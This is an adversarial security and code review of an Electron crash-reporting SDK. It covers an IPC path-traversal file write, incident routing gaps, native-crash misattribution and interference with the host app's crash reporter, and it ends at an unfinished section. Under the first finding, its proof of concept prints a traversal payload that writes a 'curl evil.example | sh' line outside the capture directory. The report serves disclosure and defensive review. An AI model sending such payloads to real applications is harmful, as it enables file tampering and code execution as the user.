# Adversarial review — @bugsee/electron

**Reviewed:** 2026-07-27 · **Scope:** packages/electron (impl 1207 LOC / 13 files, tests 2025 LOC / 16 files; 115 tests green at baseline)
**Verdict:** The architecture claimed in the prior is real and largely as-built: main owns the session, renderers stream capture UP over a preload `contextBridge` bridge, control flows DOWN, native crashes are harvested-and-bundled next launch, and the package genuinely has **no `electron` and no DOM import** (verified — `electron` appears only in comments). The preload surface is minimal and correctly channel-locked. But the **inbound IPC boundary is unauthenticated and unvalidated in a way that is directly exploitable**: a renderer-supplied `type` string flows unchecked into a filesystem path in the main process, giving any compromised renderer an arbitrary-path, arbitrary-content file append as the app user (empirically demonstrated below, not theorised). Second, **session convergence is only half-built**: capture converges, but incidents do not — `launchRenderer` leaves the browser client's own assemble+upload pipeline in place over a *streaming store whose snapshot is empty by construction*, so a renderer crash produces a capture-less bundle under a *different* session id, while the owner session that holds all that renderer's capture never learns an incident happened. `@bugsee/webview` — the acknowledged pattern source — solves exactly this with `createWebViewReportPipeline`; Electron simply omits it. Third, native-crash harvest is `harvest-all` against an **app-global** Crashpad dir, so the canonical `requestSingleInstanceLock` pattern misattributes (and deletes) a *live* instance's dumps. The design docs' E3/E4 promises of timestamp normalisation, `windowId` tagging and `render-process-gone`/`web-contents-created` lifecycle hookup are **not implemented at all**. Test quality is above average for the pure units (real-fs round-trip for the crash source, a genuine merged-bundle e2e) but the e2e fakes `@bugsee/browser`'s launch wholesale, so nothing renderer-side is exercised, and no test anywhere feeds the main process a hostile payload.

---

## SEV1

### 1. Arbitrary file write in the MAIN process from any compromised renderer (path traversal via the unvalidated wire `type`)
- **Where:** `packages/electron/src/main-receiver.ts:50` (the `store.add` call) · `packages/electron/src/protocol.ts:57-69` (decode: no domain check on `t`, no check on `ts`) · `packages/core/src/file-chunk-backend.ts:89` · `packages/node-utils/src/fs-chunk-storage.ts:33-40`
- **What:** `decodeStreamEntry` validates only `k === 'entry'` and `t !== undefined`. `t` is *typed* `FileType` but is untrusted JSON — the value is passed through verbatim (`protocol.ts:61`) and handed to `store.add({ type: decoded.type, … })` (`main-receiver.ts:50-54`). The main store is, by default, the disk-backed chunk store (`packages/node/src/data-location.ts:115` — `capturedDataStore` defaults to `'disk'`), whose write path is `storage.append(gen, chunk, record.type, encoded)` (`file-chunk-backend.ts:89`) → `join(chunkDir(gen, chunk), file)` (`fs-chunk-storage.ts:33`) → `appendFileSecure`. **The renderer therefore controls a path segment that is `path.join`ed — `..` escapes.** The *content* is attacker-controlled too: the frame is `${record.timestamp}\t${record.serialized}\n` and `timestamp` is `message.ts ?? 0` with no numeric check, so a string `ts` containing newlines lands verbatim.
- **Why it matters:** XSS in loaded web content (or a compromised renderer-side npm dependency) is the standard Electron threat model, and the preload deliberately exposes `post()` to the page's main world (`preload-bridge.ts:60-63`), so page script can call it directly. Append-only is not a mitigation: appending to `~/.zshrc`, `~/.bash_profile`, a crontab, or any `.js` the app itself loads is code execution as the user — i.e. a renderer-sandbox escape delivered *by the SDK*. `enforceByteCap` (`chunk-capture-store.ts:60-69`) does not help: it evicts chunk *directories*, never the out-of-tree file, so the write is also unbounded.
- **Evidence (empirical, run against unmodified sources; scratch test deleted afterwards):** wiring the real `createElectronMainReceiver` to a real `createFileCaptureStore(createFsChunkStorage(root))` and emitting
  `{"k":"entry","t":"../../../../victim/pwned.txt","ts":"#!/bin/sh\ncurl evil.example | sh\n#","p":{"evil":"payload"}}`
  produced, **outside the capture root**, a file containing exactly:
  `"#!/bin/sh\ncurl evil.example | sh\n#\t{\"evil\":\"payload\"}\n"`.
  A first run with an off-by-one depth threw `ENOENT … appendFileSync` with the stack `appendFileSecure (fs-storage.ts:33) ← fs-chunk-storage.ts:39 ← file-chunk-backend.ts:89 ← chunk-capture-store.ts:76 ← listener (main-receiver.ts:50)` — which independently proves both the reachability *and* finding #6 (the throw escapes the ipcMain listener).
- **Fix shape (not applied):** validate `t` against the known `FileType` set and `ts` as a finite number in `decodeStreamEntry`; drop the message otherwise.

### 2. Renderer incidents leave the converged session: empty capture + a foreign session id, and the owner never learns of the crash
- **Where:** `packages/electron/src/launch-renderer.ts:72` (full `@bugsee/browser` `launchCore` with only the store swapped) · `packages/electron/src/launch-renderer.ts:86` (the handshake session id goes to an *optional user callback* and nowhere else) · `packages/core/src/streaming-capture-store.ts:49-60,94-95` (`snapshot()` is empty by construction) · `packages/core/src/bugsee-api.ts:30` (each process mints its own `sessionId`)
- **What:** `launchRenderer` swaps the capture store but leaves the browser client's own trigger + upload pipeline intact (`packages/browser/src/launch.ts:390-394`). A renderer uncaught error therefore assembles a bundle from `createCaptureExporter(captureStore)` (`packages/core/src/client.ts:315`) over the streaming store — whose `stream()` yields nothing and whose `drainAll()` returns an empty Map. The bundle is uploaded from the renderer under the renderer client's **own** random session id. Meanwhile the main session, which holds every one of that renderer's capture entries, records no incident at all.
- **Why it matters:** this is the SDK's headline promise ("ONE session artifact stitching video+console+network to the crash") failing exactly at the crash. The user gets an issue with no logs, no network, no replay, in a session that contains nothing else — and a second, silent session containing all the data and no issue.
- **Evidence that this is an omission, not a design choice:** `@bugsee/webview`, the acknowledged source of the streaming-store pattern, replaces the client's trigger pipeline for precisely this reason — `packages/webview/src/launch.ts:224` (`triggerPipeline = createWebViewReportPipeline(...)`) with `packages/webview/src/webview-report-pipeline.ts:5-11`: *"the Client routes EVERY report … here instead of assembling + uploading a bundle … every incident ALWAYS streams up as a `crash` ENTRY"*. `@bugsee/electron` has no analogue — grep for `triggerPipeline`/report forwarding in `packages/electron/src` returns nothing. The design doc also called for it: `docs/design/electron.md:48` (*"report triggers (renderer-streamed `report` OR render-process-gone) → open one"*) and `:105` (*"hook renderer lifecycle (`web-contents-created`/`render-process-gone`)"*).
- **Not covered by any test:** the e2e fires the report on the **main** client (`electron-e2e.test.ts:225`) and fakes `@bugsee/browser`'s launch entirely (`:147-153`), so no renderer-originated report is ever exercised.

### 3. A renderer crash produces no incident anywhere (no `render-process-gone` / lifecycle wiring)
- **Where:** absence — `grep -n "render-process-gone\|web-contents-created\|destroyed\|isDestroyed" packages/electron/src/*.ts` (non-test) matches only comments (`main-control.ts:4-5,53,60`). `packages/electron/src/launch-main.ts:99-107` wires only the receiver and the control manager.
- **What:** when a renderer dies (OOM, GPU fault, native crash in the renderer process), nothing in the main process notices. Its streamed capture is safely in the owner's ring, but no report is ever opened against it, and the dead `webContents` stays registered forever (see SEV2 #7). Combined with #2, an Electron app's most common crash class — a renderer going down — yields **either** nothing at all (process killed before JS ran) **or** a capture-less bundle in a phantom session (JS error path).
- **Why it matters:** this is the single scenario the whole "main outlives renderers" architecture exists to cover (`docs/design/electron.md:56`), and it is the one that is unimplemented.

### 4. Native dumps are attributed to the wrong session — and a *live* instance's dumps are stolen and deleted
- **Where:** `packages/electron/src/native-crash-source.ts:65-77` (`harvest` returns **every** `.dmp` under `<dumpDir>/completed`, with no session/mtime/annotation filter) · `:79-84` (`claim` unlinks) · `packages/node/src/recover-instances.ts:117-136` (recovery reads the *dead* sibling's marker but harvests from the shared dir) · `packages/electron/src/launch-main.ts:78-86` (`dumpDir` = `crashReporter.getCrashesDirectory()`, which the source's own comment at `native-crash-source.ts:12-13` describes as *"one app-global Crashpad dir"*).
- **What:** the Crashpad DB is per-app, not per-run and not per-instance. Recovery walks each **dead** sibling subtree, reads its marker, and attributes *the entire completed dir* to that marker's session, then deletes each dump once its bundle uploads.
- **Concrete real-world trigger — the canonical `app.requestSingleInstanceLock()` pattern:** the user double-launches the app. Instance 2 initialises Bugsee (SDKs are told to init as early as possible), writes its own instance subtree + crashpad marker, loses the lock, and quits ~1 s later. Its subtree is now DEAD. On the *next* launch, recovery finds that marker and attributes **every accumulated dump — including ones written moments earlier by instance 1, which is still running** — to instance 2's one-second session, uploads them under it, and `unlink`s them. Instance 1's genuine native crash is now filed against a session with essentially no capture, and the evidence is gone.
- **Why it matters:** wrong-session attribution of crashes plus destruction of another live instance's crash evidence. The design defers only the narrower case (*"the rare case of several concurrent dead siblings"*, OQ-5, `native-crash-source.ts:11-14`); the live-sibling case is not acknowledged anywhere.
- **Tests:** `native-crash-source.test.ts` never constructs a multi-session/multi-marker or live-sibling scenario; every case has exactly one marker.

### 5. The SDK hijacks the host app's own `crashReporter`, and an unguarded `start()` can abort `launchMain`
- **Where:** `packages/electron/src/crash-reporter.ts:41-53` · `packages/electron/src/launch-main.ts:111-118` · `packages/electron/src/launch-main.ts:55` (option destructuring)
- **What:** (a) `installNativeCrashReporter` calls `crashReporter.start({ …startOptions, uploadToServer: false, extra: {…} })` **unconditionally**, with no check for whether the app already started Crashpad. It force-sets `uploadToServer: false` and *replaces* the `extra` param map. An app that ships its own crash reporting (its own `submitURL`, or another vendor's Electron SDK) has its uploads silently turned off and its crash annotations dropped. (b) `startOptions` is declared on `InstallNativeCrashReporterOptions` (`crash-reporter.ts:33`) but `launchMain` never forwards it — the destructure at `launch-main.ts:55` and the call at `:112-117` pass only `crashReporter`/`appToken`/`sessionId`/`extra`, so an app *cannot* supply `companyName`, `productName`, `globalExtra`, `compress` or `ignoreSystemCrashHandler` through the public entry point. (c) The call at `:112` is **not** wrapped in try/catch, unlike the deliberately-guarded cleanup at `:123-131`; any throw from `crashReporter.start` (a second-start guard, a rejected option) propagates out of `launchMain()` and takes down app startup.
- **Why it matters:** an observability SDK must never disable, or crash, the host's own crash reporting. The whole `crashReporter` integration is also opt-in via one option with no documented "we take exclusive ownership of Crashpad" contract.
- **Tests:** `launch-main.test.ts:146-156` asserts `start` was called with `uploadToServer:false`; nothing asserts behaviour when the app already started the reporter, and nothing asserts `launchMain` survives a throwing `start`.

---

## SEV2

### 6. Any throw on the capture write path escapes the `ipcMain` listener into Electron's IPC dispatch
- **Where:** `packages/electron/src/main-receiver.ts:41-56` — the listener body has no try/catch around `options.store.add(...)` or `options.onEntry?.(...)`.
- **What / why:** `store.add` is a synchronous disk write (`appendFileSecure`). ENOSPC, EACCES, EMFILE, a read-only volume, or the hostile `type` of SEV1 #1 all throw *inside* an `ipcMain` handler — an uncaught exception in the main process. Proven live: the ENOENT stack in SEV1 #1 terminates at `listener (main-receiver.ts:50)`. Every other Electron seam in this package is defensively guarded (`main-control.ts:56-62`, `launch-main.ts:123-131`, `pixel-video-controller.ts:42-52,58-65`); the highest-frequency, renderer-driven one is not.

### 7. The renderer registry never shrinks — leaked `webContents`, wrong `rendererCount`, broadcasts to the dead
- **Where:** `packages/electron/src/main-control.ts:54` (`const renderers = new Set<ControlSenderLike>()`), `:80` (`renderers.add(sender)`) — there is no `renderers.delete` anywhere in the package.
- **What / why:** every window that ever said hello is retained for the process lifetime, pinning destroyed `webContents` objects (and whatever they retain) in the main process. An app that opens/closes windows in a loop leaks monotonically; `rendererCount` (`:102-104`, the documented "window count") is wrong after the first close; every `pause`/`resume`/`flush`/`stop` iterates a growing set of corpses (harmless, because `sendTo` swallows, but O(dead windows) per broadcast). Fix shape: unregister on `destroyed`/`render-process-gone` — which is also the hook missing for SEV1 #3.

### 8. Redaction configured on the main process does not apply to renderer capture, and the `red` provenance flag is dead
- **Where:** `packages/electron/src/launch-renderer.ts:68-71` (`createElectronRendererCaptureStore` is built without `redactedFor`) · `packages/electron/src/main-receiver.ts:50-54` (the decoded `redacted` flag is discarded; the payload is stored verbatim, never re-filtered) · compare `packages/webview/src/launch.ts:212`, which *does* resolve `FiltersToken` and wire it into the streaming store.
- **What / why:** filters run per-process inside the providers (`packages/capture/src/log-provider.ts:34-36`, `network-provider.ts:92-94`, each reading that process's carrier). Renderer data is filtered only by filters set *in the renderer*. An app that follows the natural "configure Bugsee once, in main" instinct ships **unredacted renderer console + network data** — which in an Electron app is where the sensitive data lives (the UI). Nothing in the control channel propagates filters down, though it propagates pause/resume/flush/stop. Additionally `red` is always `false` on the wire and dropped on receipt, so the provenance contract inherited from the WebView protocol is inert here.

### 9. One unreadable `.dmp` aborts the entire native harvest — permanently
- **Where:** `packages/electron/src/native-crash-source.ts:70-76` (no per-file try/catch; `fs.readFile` throwing escapes `harvest`) · `packages/core/src/native-crash-recovery.ts:93-146` (the outer catch returns `complete: false`) · `packages/node/src/recover-instances.ts:129-134,151-153`.
- **What / why:** the per-dump try/catch in core is *inside* the loop, but `harvest()` runs before it. A single `EACCES`/`EPERM`/vanished file (a dump removed by another instance between `readdir` and `readFile` — a real race given the shared dir, see SEV1 #4) makes harvest throw, so **zero** dumps of that session are recovered, `complete` stays false, the marker is kept, `nativePending` blocks subtree removal (`recover-instances.ts:151`), and the dead subtree plus its capture generation are retained *forever*, retried every launch with the same outcome. Also in the same loop: every dump is read fully into memory and all of them are held simultaneously in `dumps` before any is processed — with no count or size cap, and dumps only removed on successful upload, an accumulated backlog is loaded in one shot at launch.

### 10. A failed native-crash upload yields a duplicate crash on the next launch
- **Where:** `packages/core/src/native-crash-recovery.ts:132-137` · `packages/core/src/durable-upload-pipeline.ts:110-122` · `packages/node/src/recover-instances.ts:103,121-128`
- **What / why:** the recovering instance enqueues through the **durable** pipeline, which persists a copy under its own `pending/` *before* attempting delivery. On `!ok` the dump is (correctly) left unclaimed *and* the durable copy remains. When that recovering instance later dies, the next launch both drains its `pending/` (re-uploading the bundle) **and** re-harvests the still-unclaimed dump into a *new* bundle with a new report id — one native crash, two issues. Bounded to upload-failure paths, but it is exactly the retry path this machinery exists for. (The delete-before-confirm ordering itself is **correct** — see the audit table below.)

### 11. `createMediaRecorderVideoSource` grows without bound and is not idempotent
- **Where:** `packages/electron/src/video-capture.ts:119-131`
- **What / why:** `chunks` is only ever pushed to — never bounded, never cleared after `snapshot()`. With the documented `timeslice` usage ("emit a chunk every N ms so a report has recent data", `:111`) a long-running renderer accumulates the *entire session's* encoded video in renderer RAM. The sibling `createCapturePageVideoSource` gets this right with an explicit drop-oldest ring (`:54,62-64`). Separately, `start()` (`:123-128`) has no idempotence guard (unlike `capturePage`'s at `:72-74`): a second call abandons the previous recorder while its `ondataavailable` keeps feeding the same array.

### 12. Pixel video is unmasked, and its permission gate defaults to *granted*
- **Where:** `packages/electron/src/pixel-video-controller.ts:43` (`const granted = (await options.hasPermission?.()) ?? true;`) · `packages/electron/src/launch-main.ts:32-37`
- **What / why:** `video: { source }` with no `hasPermission` runs the source with **no permission check at all** — the gate the design describes as the "macOS Screen-Recording (TCC) permission gate" is opt-in and default-open, so the safety property depends entirely on the integrator remembering to pass it. More importantly, the pixel path has **no redaction seam of any kind**: raw window pixels (`capturePage`) bypass every masking control that protects the rrweb default (`blockSelector`, `blackout`, password floors), so passwords and PII typed into the app are captured verbatim into `video.webm`. The OS still gates `getDisplayMedia` itself, which bounds the exposure to the app's own window for `capturePage` sources — but that window is exactly where the app's sensitive UI is.

### 13. `post` can throw into instrumented host code paths
- **Where:** `packages/electron/src/preload-bridge.ts:61-63` (`ipcRenderer.send` unguarded) · `packages/electron/src/launch-renderer.ts:39-41,48-50` (`readBridge()?.post?.(raw)` unguarded) · contract at `packages/core/src/streaming-capture-store.ts:29` (*"The transport sink … **Must never throw**"*) and `renderer-capture-store.ts:9-10` (same claim).
- **What / why:** the invariant the streaming store relies on is asserted in comments but never enforced. `ipcRenderer.send` can throw (frame being torn down during navigation/close, non-cloneable/oversized argument). `store.add` runs inside the capture hot path — i.e. inside the app's own `console.log`, `fetch`, or XHR call — so a throw surfaces as an exception in *host application code*, violating the repo's binding "interceptors must not alter app behavior" principle. A one-line try/catch in `registerBugseePreload`'s `post` closes it.

### 14. Multi-instance disk coexistence: the inherited node defect is materially more likely on Electron
- **Where:** `packages/node/src/liveness.ts:15` (`DEFAULT_PATIENT_MS = 120_000`) · `packages/node/src/liveness-heartbeat.ts:22` (10 s beat) · `packages/node/src/recover-instances.ts:168-182` · `packages/node/src/data-location.ts:115` (default root `os.tmpdir()/bugsee/<appTokenHash>` — shared by every instance of the same app token; **not** `userData`)
- **What / why:** a subtree whose pid is alive but whose heartbeat is >120 s stale is treated as DEAD and reclaimed. On a server, a 120-second timer stall is pathological; on a desktop it is routine — **laptop sleep/hibernate stops the beat while the pid stays alive**. Wake the machine, launch a second copy (or the app relaunches after an update), and the sibling coordinator deletes the *running* instance's capture chunks and pending bundles. The `requestSingleInstanceLock` pattern makes second launches a normal, frequent event rather than a rare one. This is the node-tier defect from the prior review; the Electron-specific exposure is that its preconditions are ordinary user behaviour.

---

## SEV3

### 15. The main receiver's only input guard is not actually tested (surviving mutation, verified)
- **Where:** `packages/electron/src/main-receiver.ts:43-45`; test at `packages/electron/src/main-receiver.test.ts:78-86`.
- **Evidence:** deleting the `if (typeof raw !== 'string') return;` guard leaves **115/115 tests passing**. The test that claims to cover it emits `12345`, which `JSON.parse` happily coerces to the string `"12345"` → parses to a number → `.k` is `undefined` → rejected downstream anyway. Control mutations prove the harness works: removing the `k !== 'entry' || t === undefined` check (`protocol.ts:57`) fails 3 tests; weakening `isHello` (`main-control.ts:73`) fails 1; dropping the `.dmp` suffix filter (`native-crash-source.ts:72`) fails 2. Every mutation was reverted from a `cp` backup and `git status --short packages/` is empty.

### 16. `mono` / `timeOrigin` are decoded and thrown away; renderer wall-clock timestamps are trusted verbatim
- **Where:** `packages/electron/src/protocol.ts:64-65` (decoded) vs `packages/electron/src/main-receiver.ts:50-54` (unused) · `packages/core/src/streaming-capture-store.ts:19-23` (why they are on the wire).
- **What:** `docs/design/electron.md:68-69` and `:102` specify that the receiver *"normalizes its `mono`+`timeOrigin` to the main process's wall-clock"* and tags entries *"with the originating window id"*. Neither happens: the raw `ts` is stored, and `windowId` is only handed to an optional `onEntry` seam that `launchMain` never supplies (`launch-main.ts:101`). The clock argument in the code comment (`main-receiver.ts:4-5` — one OS clock, so timestamps are comparable) is sound for honest renderers, so this is drift + dead protocol surface rather than a correctness bug; but it does mean an entry's position in the merged timeline is entirely renderer-controlled, and **entries carry no process attribution at all** in the final bundle.

### 17. Pause state is not re-applied after a renderer reload
- **Where:** `packages/electron/src/main-control.ts:80-82` (hello ⇒ re-register + `session` reply only) · `packages/electron/src/launch-renderer.ts:65-67` (`paused` starts `false`).
- **What:** if main has broadcast `pause` and a renderer then reloads or a new window opens, that renderer starts streaming immediately and is never told the session is paused. The handshake reply is the obvious place to carry the current state.

### 18. Channel/key override surface is asymmetric
- **Where:** `preload-bridge.ts:39-47` and `main-receiver.ts:26` / `main-control.ts:30-33` all accept overrides, but `launchMain` (`launch-main.ts:101,106`) forwards none.
- **What:** an app that overrides the channels in its preload silently gets a session with zero renderer capture — the main side has no way to match without dropping to the low-level factories. Either forward the overrides or remove them from the preload API.

### 19. Any renderer can obtain the owner session id
- **Where:** `packages/electron/src/main-control.ts:71-83` — `onHello` replies to *any* sender on `bugsee:hello` with `sessionId`, with no allowlist of registered `webContents`.
- **What:** a `BrowserView`/`<webview>` rendering untrusted third-party content that happens to load the Bugsee preload learns the session id and can stream entries into it (see SEV1 #1). Low direct impact (the session id is not a credential), but it is the identity used for minidump correlation, and there is no notion of which renderers are *supposed* to be part of the session.

### 20. Test theater in the e2e and unit suites
- `electron-e2e.test.ts:147-153`: `fakeBrowserLaunch` replaces `@bugsee/browser`'s `launchCore` entirely and returns `{ client: { stop, flush } }`. Everything renderer-side — real capture sources, the real report path, IDB, replay, the browser client's session — is therefore unexercised; the "e2e" verifies the *main* half plus a hand-driven `store.add`. This is why SEV1 #2 is invisible to the suite.
- `main-receiver.test.ts:33-42`, `launch-main.test.ts:89`: every wire fixture launders the type through `type as never`, i.e. the tests themselves encode the assumption that the wire type is unvalidated. No test in the package ever feeds the main process a hostile or malformed-but-parseable payload.
- `native-crash-source.test.ts`: good real-fs round trip (`:106-121`), but all fixtures are hand-built `.dmp` byte arrays with one marker; no partial-write, no unreadable file, no multi-session, no live-sibling case.
- `crash-reporter.test.ts` / `launch-main.test.ts:146-212`: assert the options object passed to a `vi.fn()` `start`; nothing asserts interaction with a pre-existing host reporter.

### 21. At-least-once duplication window between `enqueue` ok and `claim`
- **Where:** `packages/core/src/native-crash-recovery.ts:132-136`.
- **What:** if the process dies between a confirmed upload and the `claim` unlink, the dump is re-harvested and re-uploaded next launch as a new report. Inherent to the ordering (and the ordering is the right one — losing a crash is worse than duplicating one); worth recording as a known property rather than a bug.

---

## IPC threat model

Threat: script execution inside a renderer (XSS in loaded content, a compromised renderer-side dependency, or a hostile `<webview>`/`BrowserView` that loads the Bugsee preload). The preload exposes `post`/`sendHello`/`onControl` into the page's **main world** by design, so all of these are reachable from page script.

| Attack from a compromised renderer | Possible? | What main does | file:line |
|---|---|---|---|
| **Attacker-controlled file path (write outside the capture dir)** | **YES — proven** | Passes wire `t` through unvalidated into `path.join` as a filename | `main-receiver.ts:50`, `protocol.ts:57-61`, `file-chunk-backend.ts:89`, `fs-chunk-storage.ts:33-40` |
| **Attacker-controlled file *content*** | **YES — proven** | `ts` unvalidated (a string with newlines is emitted verbatim before the tab) + `p` re-serialized as-is | `protocol.ts:63,68`, `file-chunk-backend.ts:86-89` |
| Crash the main process (uncaught exception in IPC dispatch) | **YES** | No try/catch around `store.add` — any fs error or the traversal above throws out of the listener | `main-receiver.ts:41-56` |
| Inject forged capture (fake logs/network/crash entries into another user's session bundle) | **YES** | No provenance, no type domain check, no per-window attribution in the bundle | `main-receiver.ts:50-55` |
| Unbounded allocation / disk consumption | **Partly** | No per-message size cap, no rate limit; disk is bounded only by the 50 MB `maxDataSize` chunk cap — which does **not** cover the out-of-tree file from row 1 | `main-receiver.ts:41-56`, `chunk-capture-store.ts:60-69`, `packages/node/src/launch.ts:105` |
| Learn the owner session id | **YES** | `hello` from any sender is answered with `sessionId` | `main-control.ts:71-83` |
| Forge *another renderer's* identity | **No** | `event.sender` is set by Electron, not by the payload; the only consumer is the optional `onEntry` seam | `main-receiver.ts:55` |
| Issue control commands upward (pause/stop other renderers) | **No** | Main listens on `bugsee:stream` (entries only) and `bugsee:hello` (handshake only); control is strictly main→renderer | `main-receiver.ts:60`, `main-control.ts:87` |
| Register unbounded fake renderers to amplify broadcasts | Bounded | Set is deduped by sender object identity, so one webContents = one entry (but never removed — SEV2 #7) | `main-control.ts:54,80` |
| Channel-name collision with the host app's own channels | Unlikely | `bugsee:stream` / `bugsee:hello` / `bugsee:control` — namespaced, though guessable and not overridable from `launchMain` | `preload-bridge.ts:10-14` |

---

## Preload surface audit

`registerBugseePreload` (`preload-bridge.ts:54-77`) exposes exactly one global, `window.__bugseeElectron`, via `contextBridge.exposeInMainWorld` — i.e. `contextIsolation` is respected and the page never touches `ipcRenderer`.

Exposed members — **three, all closures over fixed channels**:
- `post(raw: string)` → `ipcRenderer.send(BUGSEE_STREAM_CHANNEL, raw)` — the channel is **not** a parameter. ✔ no channel-injection.
- `sendHello(raw: string)` → `ipcRenderer.send(BUGSEE_HELLO_CHANNEL, raw)`. ✔ channel-locked.
- `onControl(handler)` → `ipcRenderer.on(BUGSEE_CONTROL_CHANNEL, …)`, forwarding only string payloads (`:68-73`). ✔ channel-locked, ✔ payload-type-checked.

**No `invoke`, no `sendSync`, no generic bridge, no `ipcRenderer` or `electron` object leak** — this is the correct minimal shape and clears the classic Electron RCE-enabler. Residual observations:

- The object is **not frozen** (`Object.freeze` is not called; `preload-bridge.ts:60-76`). Whether page script can replace the members depends on `contextBridge`'s own property definition semantics, which I cannot verify without real Electron. Freezing costs one line and removes the question.
- `onControl` has **no subscription cap** — page script may call it in a loop, registering unbounded `ipcRenderer.on` listeners (`:67-74`). Bounded nuisance (listener-count warning, memory), not a security hole.
- The API is exposed to *whatever* the renderer loads, including untrusted remote content, and `post` is the entry point for SEV1 #1. **The preload is not the defect — the missing validation on the receiving end is.** Preload-side sanity checks would not help (a malicious page bypasses them by construction); main must validate.
- `resolveRendererBridge` (`launch-renderer.ts:46-58`) re-reads `globalThis.__bugseeElectron` per call and no-ops when absent — late-attach safe, and it never throws if the preload is missing. ✔

---

## Session-convergence lifecycle matrix

| Event | Streamed capture preserved? | Incident/report handled? | file:line |
|---|---|---|---|
| Renderer streams normally | ✔ merged into the owner's store as it arrives (nothing buffered renderer-side, so nothing to lose) | n/a | `renderer-capture-store.ts:22-30`, `main-receiver.ts:50-54` |
| **Renderer JS error / `logException`** | ✔ capture is in main | ✘ **report assembled *in the renderer* from an empty snapshot, uploaded under a foreign session id** | `launch-renderer.ts:72`, `streaming-capture-store.ts:94-95`, `bugsee-api.ts:30` (SEV1 #2) |
| **Renderer process crash / OOM / `render-process-gone`** | ✔ capture up to the last posted entry is in main | ✘ **no detection at all — no report is ever opened** | absence; `docs/design/electron.md:48,105` (SEV1 #3) |
| `webContents.destroy()` / window close | ✔ prior capture retained in main | ✘ sender stays in the registry forever | `main-control.ts:54,80` (SEV2 #7) |
| Renderer reload | ✔ | Partial — re-`hello` re-registers (deduped) and re-learns the session, but a prior `pause` is not re-applied | `main-control.ts:80-82`, `launch-renderer.ts:65-67` (SEV3 #17) |
| In-page navigation | ✔ | Same as reload (the preload re-runs; `launchRenderer` must be re-invoked by the app) | `launch-renderer.ts:75-89` |
| `client.flush()` on main | ✔ | Broadcast `flush` DOWN, then the local drain; renderers have nothing local to drain, so this is advisory | `launch-main.ts:135-141`, `renderer-control.ts:35-37` |
| `client.stop()` on main | ✔ | `stop` broadcast → `receiver.stop()` → node stop, all inside a try/catch so the real shutdown always runs; in-flight IPC after `removeListener` is silently dropped | `launch-main.ts:122-133` |
| Main quits / app exits | Inherited from `@bugsee/node` (flush bound to `'exit'`) | — | out of scope here; see the node review |
| Clock skew across processes | N/A — all entries carry wall-clock unix-ms from one OS clock, stored verbatim; `mono`/`timeOrigin` are decoded and discarded | — | `main-receiver.ts:4-5`, `protocol.ts:64-65` (SEV3 #16) |

**Ordering:** entries are appended in IPC arrival order into the current 1-second part; the merged `logs.json` is ordered by part, not globally re-sorted by `timestamp`. Renderer `seq` is decoded (`protocol.ts:62`) and dropped. Fine for honest renderers on one OS clock; entirely renderer-controlled otherwise.

---

## Native-crash recovery audit (NM1–NM5)

- **Delete-before-confirm ordering — CORRECT.** `recoverNativeCrashes` claims (unlinks) a dump **only** after `uploadPipeline.enqueue(...)` resolves `{ok:true}` (`native-crash-recovery.ts:132-136`), and the durable pipeline resolves `ok` only after real delivery, having persisted a durable copy *before* the attempt (`durable-upload-pipeline.ts:110-122`). On `!ok` the dump is left for a later launch. ✔ No data-loss ordering bug here.
- **Cleanup after harvest — present but conditional.** Dumps are removed only on successful delivery. There is **no retention bound** on `<crashDumps>/completed`: a persistently failing upload (offline app, bad token, rejected bundle) means dumps accumulate indefinitely *and* are re-read in full into memory at every launch (`native-crash-source.ts:70-76`). See SEV2 #9.
- **Idempotency — mostly, with two gaps.** Running recovery twice over the same state is safe for the *success* path (claimed dumps are gone; the marker is removed when `complete`). Gaps: (a) a crash between `enqueue`-ok and `claim` duplicates the report (SEV3 #21); (b) an upload failure duplicates it via the durable-queue + re-harvest double path (SEV2 #10). Nothing destroys data on a repeat run.
- **Dump ↔ session matching — INCORRECT for anything but the single-run case.** `harvest` returns every `.dmp` in the app-global completed dir and attributes all of them to whichever dead sibling's marker is being processed (SEV1 #4). The zero-dump case is handled cleanly (`native-crash-recovery.ts:96-99` → `complete:true`, marker cleared). Multiple dumps are handled (one bundle per dump, sharing one drained capture, `:102-141`) but all inherit the same session. **Dump without a session:** a dump written before any marker existed, or after its marker was cleared, is simply mis-attributed to the next dead sibling processed — never dropped. **Session without a dump:** correct (returns `complete:true`, marker cleared, subtree swept).
- **Partial / crash-during-crash `.dmp` — NOT handled.** Crashpad finalises into `completed/` by rename so a torn file is unlikely, but `harvest` has no per-file guard: any `readFile` failure (permissions, a file removed by a racing instance, a filesystem error) throws out of `harvest` and aborts recovery of **every** dump for that session, permanently (SEV2 #9). A per-file try/catch that skips-and-reports is the one-line fix; the sibling report/bundle recovery paths already do exactly this (`recover-instances.ts:78-85`, `capture-exporter.ts:36-43`).
- **Synthesis correctness.** The synthesized incident (`native-crash-recovery.ts:112-131`) is `exception_type: 'native'`, `ndkCrash: true`, `minidumpFile: <name>`, with the dump as a binary attachment and the crashed generation's drained capture, stamped with the marker's launch-time attributes/user. That matches the design (`docs/design/electron-native-crashes.md` §6.1). Note the crash's timestamp/summary is generic (`'Native crash'`) — the dump's own crash time is not extracted, so the report time is recovery time.

---

## Host crashReporter interference

**The SDK takes exclusive, unconditional ownership of Electron's Crashpad.** `installNativeCrashReporter` (`crash-reporter.ts:41-53`) calls `crashReporter.start(...)` with no probe of prior state, force-sets `uploadToServer: false`, and replaces `extra` wholesale. Consequences for a host app that already uses `crashReporter` (its own backend, or another vendor's Electron SDK):

1. **Its uploads are turned off** — `uploadToServer:false` is hard-coded and cannot be overridden by the caller (it is `Omit`ted from `startOptions` at `crash-reporter.ts:33` *by design*).
2. **Its crash annotations are dropped** — only `crashReporterExtra` passed to `launchMain` survives, and it is merged *under* Bugsee's own keys (`:47-52`).
3. **Its `submitURL`/`companyName`/`productName`/`globalExtra`/`compress` cannot be preserved** — `startOptions` exists on the internal API but `launchMain` never forwards it (`launch-main.ts:112-117`), so the public entry point cannot pass any of them.
4. **A throwing `start()` aborts `launchMain`** — the call is unguarded (`launch-main.ts:111-118`), unlike the deliberately-guarded shutdown path 10 lines below.

Mitigating facts: the integration is **opt-in** (nothing happens unless the app passes `crashReporter`), and `installNativeCrashReporter` is invoked only on the first launch (`launch-main.ts:92-94,111`), so it cannot double-start itself. The gap is entirely about coexisting with a reporter the app started first — which the code neither detects nor documents.

---

## What is unverified without real Electron

Every test in this package runs against hand-built fakes in a `node` vitest environment (`vitest.config.ts:6`); no Electron binary is executed anywhere in the repo. The following are therefore **unverified by any test**, and several are load-bearing for the findings above:

